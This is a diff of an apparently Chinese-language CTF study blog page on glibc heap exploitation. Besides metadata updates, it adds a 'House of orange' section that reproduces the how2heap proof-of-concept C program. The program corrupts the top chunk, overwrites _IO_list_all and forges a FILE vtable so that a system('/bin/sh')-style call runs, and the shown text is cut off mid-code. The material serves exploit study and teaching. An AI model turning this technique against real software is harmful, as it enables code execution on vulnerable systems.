@@ -22,7 +22,7 @@
     <meta name="description" content="2.23（部分）fastbin_dump123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;  fprintf(stderr, &amp;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HOW2HEAP">
-<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/index.html">
+<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/25/sync-typora-pwn-how2heap-c67585/index.html">
 <meta property="og:site_name" content="Pwn Notes">
 <meta property="og:description" content="2.23（部分）fastbin_dump123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;  fprintf(stderr, &amp;">
 <meta property="og:locale" content="zh_CN">
@@ -138,17 +138,41 @@
 <meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102103816165.png">
 <meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102104726964.png">
 <meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102104758758.png">
-<meta property="article:published_time" content="2026-11-13T11:08:05.000Z">
-<meta property="article:modified_time" content="2026-11-13T11:42:18.156Z">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125190132468.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125105056244.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125150114614.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125150302006.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125151005869.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125151328166.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125151133061.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125190857619.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125191041827.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125191120391.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125195731200.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125195959512.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125200121599.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125201742610.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125201814947.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125201847173.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125203126677.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125203115043.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261125203733845.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261126000422824.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261126000444189.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261126000826368.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261126001351918.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261126001548885.png">
+<meta property="article:published_time" content="2026-11-25T16:24:33.000Z">
+<meta property="article:modified_time" content="2026-11-25T16:29:00.632Z">
 <meta property="article:author" content="henan808">
 <meta property="article:tag" content="UAF">
 <meta property="article:tag" content="unlink">
-<meta property="article:tag" content="fastbin">
 <meta property="article:tag" content="unsorted-bin">
 <meta property="article:tag" content="double-free">
+<meta property="article:tag" content="fastbin">
 <meta property="article:tag" content="HouseOfSpirit">
+<meta property="article:tag" content="IO-FILE">
 <meta property="article:tag" content="malloc-consolidate">
-<meta property="article:tag" content="glibc2.35">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183522092.png">
   
@@ -439,8 +463,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-11-13 19:08" pubdate>
-          2026-11-13 19:08
+        <time datetime="2026-11-26 00:24" pubdate>
+          2026-11-26 00:24
         </time>
       </span>
     
@@ -451,7 +475,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          14k 字
+          24k 字
         
       </span>
     
@@ -462,7 +486,7 @@
         
         
         
-          115 分钟
+          201 分钟
         
       </span>
     
@@ -514,7 +538,7 @@
         aria-expanded="true"
       >
         题目复现
-        <span class="list-group-count">(13)</span>
+        <span class="list-group-count">(14)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
@@ -592,7 +616,7 @@
     
       
       
-        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3"
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3"
            class="list-group-item list-group-item-action
            ">
           <span class="category-post">ciscn2019final3</span>
@@ -647,7 +671,7 @@
     
       
       
-        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）"
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）"
            class="list-group-item list-group-item-action
            ">
           <span class="category-post">hitcon2018childrentcache（off by null）</span>
@@ -813,7 +837,7 @@
     
       
       
-        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/" title="HOW2HEAP"
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-how2heap-c67585/" title="HOW2HEAP"
            class="list-group-item list-group-item-action
            active">
           <span class="category-post">HOW2HEAP</span>
@@ -836,7 +860,7 @@
         aria-expanded="false"
       >
         其他赛事
-        <span class="list-group-count">(1)</span>
+        <span class="list-group-count">(2)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
@@ -847,6 +871,15 @@
           
   <div class="category-post-list">
     
+    
+      
+      
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-easyret2libc-c37693/" title="easyret2libc"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">easyret2libc</span>
+        </a>
+      
     
       
       
@@ -1228,7 +1261,96 @@
 <p><img src="/pwn-notes/images/notes/image-20261102104726964.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102104726964"></p>
 <p><img src="/pwn-notes/images/notes/image-20261102104758758.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102104758758"></p>
 <p>size字段已经修改完成</p>
-<!-- sync-hash: 67ab57d1d02320a524df17e76269e3cd228c49b5738c22c6924f29bffd6c9f26 -->
+<h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br><span class="hljs-comment">  It requires a leak of the heap and the libc </span><br><span class="hljs-comment">  &lt;House of Orange 技术利用堆溢出漏洞来篡改 _IO_list_all 指针。它（在利用时）需要堆地址和 libc 地址的泄露。”&gt;</span><br><span class="hljs-comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   This function is just present to emulate the scenario where</span><br><span class="hljs-comment">   the address of the function system is known.</span><br><span class="hljs-comment">   &lt;这个函数仅仅是为了模拟‘已知 system 函数地址’的场景而存在的&gt;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span> <span class="hljs-params">( <span class="hljs-type">char</span> *ptr)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span><br><span class="hljs-comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span><br><span class="hljs-comment">      </span><br><span class="hljs-comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span><br><span class="hljs-comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span><br><span class="hljs-comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span><br><span class="hljs-comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span><br><span class="hljs-comment">      there are two possibilities:</span><br><span class="hljs-comment">       1) Extend the Top chunk</span><br><span class="hljs-comment">       2) Mmap a new page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If the size requested is smaller than 0x21000, then the former is followed.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span> *p1, *p2;<br>    <span class="hljs-type">size_t</span> io_list_all, *top;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span><br>        <span class="hljs-string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);<br>  <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span><br>        <span class="hljs-string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Firstly, lets allocate a chunk on the heap.</span><br><span class="hljs-comment">    */</span>这是申请堆块<br>        <br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-16</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       The heap is usually allocated with a top chunk of size 0x21000</span><br><span class="hljs-comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span><br><span class="hljs-comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span><br><span class="hljs-comment">       it must also be page aligned at the end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span><br><span class="hljs-comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So that means that there are two conditions that must always be true.</span><br><span class="hljs-comment">        1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span><br><span class="hljs-comment">       What&#x27;s left is 0x20c01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now, let&#x27;s satisfy the conditions</span><br><span class="hljs-comment">       1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment">    */</span><br><br>    top = (<span class="hljs-type">size_t</span> *) ( (<span class="hljs-type">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);<br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;<br><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the Top chunk.</span><br><span class="hljs-comment">       Malloc tries to service this request by extending the Top chunk</span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In the usual scenario, the heap looks like the following</span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ...    |</span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment">      heap start                              heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the new area that gets allocated is contiguous to the old heap end.</span><br><span class="hljs-comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span><br><span class="hljs-comment">       which is basically a temporary chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In our scenario however, the heap looks like</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">     heap start                            heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span><br><span class="hljs-comment">       So the area between the second chunk and the heap end is unused.</span><br><span class="hljs-comment">       And the old Top chunk gets freed.</span><br><span class="hljs-comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span><br><span class="hljs-comment">       it gets added to list of unsorted bins.</span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the top chunk.</span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment">       And ultimately invokes _int_free</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Finally the heap looks like this:</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">     heap start                                             new heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Note that the above chunk will be allocated in a different page</span><br><span class="hljs-comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span><br><span class="hljs-comment">      top chunk so we could overwrite the chunk&#x27;s size.</span><br><span class="hljs-comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span><br><span class="hljs-comment">      of this chunk in the unsorted bin list.</span><br><span class="hljs-comment">      There are two common ways to exploit the current state:</span><br><span class="hljs-comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span><br><span class="hljs-comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span><br><span class="hljs-comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span><br><span class="hljs-comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span><br><span class="hljs-comment">      is triggered when the libc detects any bogus state of the heap.</span><br><span class="hljs-comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span><br><span class="hljs-comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span><br><span class="hljs-comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span><br><span class="hljs-comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span><br><span class="hljs-comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span><br><span class="hljs-comment">      More about file-pointer exploitation can be found here:</span><br><span class="hljs-comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span><br><span class="hljs-comment">      currently point to the libc&#x27;s main_arena.</span><br><span class="hljs-comment">    */</span><br><br>    io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      We plan to overwrite the fd and bk pointers of the old top,</span><br><span class="hljs-comment">      which has now been added to the unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      When malloc tries to satisfy a request by splitting this free chunk</span><br><span class="hljs-comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span><br><span class="hljs-comment">      in libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span><br><span class="hljs-comment">      case.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span><br><span class="hljs-comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span><br><span class="hljs-comment">    */</span><br> <br>    top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span><br><span class="hljs-comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-type">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span><br><span class="hljs-comment">      in _IO_list_all.</span><br><span class="hljs-comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span><br><span class="hljs-comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span><br><span class="hljs-comment">      The address of the next file pointer is located at base_address+0x68.</span><br><span class="hljs-comment">      This corresponds to smallbin-4, which holds all the smallbins of</span><br><span class="hljs-comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span><br><span class="hljs-comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span><br><span class="hljs-comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span><br><span class="hljs-comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span><br><span class="hljs-comment">      in this list first, therefore, iterates over the list.</span><br><span class="hljs-comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span><br><span class="hljs-comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span><br><span class="hljs-comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span><br><span class="hljs-comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span><br><span class="hljs-comment">      therefore, occupying the smallbin[4] location in the main_arena and</span><br><span class="hljs-comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      In addition to sorting, malloc will also perform certain size checks on them,</span><br><span class="hljs-comment">      so after sorting the old top chunk and following the bogus fd pointer</span><br><span class="hljs-comment">      to _IO_list_all, it will check the corresponding size field, detect</span><br><span class="hljs-comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span><br><span class="hljs-comment">      and finally triggering the abort call that gets our chain rolling.</span><br><span class="hljs-comment">      Here is the corresponding code in the libc:</span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span><br><span class="hljs-comment">    */</span><br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span><br><span class="hljs-comment">      required by the function _IO_flush_all_lockp and tested here:</span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We want to satisfy the first condition:</span><br><span class="hljs-comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment">    */</span><br><br>    FILE *fp = (FILE *) top;<br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span><br><span class="hljs-comment">    */</span><br><br>    fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment">    */</span><br><br>    fp-&gt;_IO_write_base = (<span class="hljs-type">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span><br>    fp-&gt;_IO_write_ptr = (<span class="hljs-type">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      4) Finally set the jump table to controlled memory and place system there.</span><br><span class="hljs-comment">      The jump table pointer is right after the FILE struct:</span><br><span class="hljs-comment">      base_address+sizeof(FILE) = jump_table</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span><br>    jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) &amp;winner;<br>    *(<span class="hljs-type">size_t</span> *) ((<span class="hljs-type">size_t</span>) fp + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-type">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span><br><br><br>    <span class="hljs-comment">/* Finally, trigger the whole chain by calling malloc */</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><br>   <span 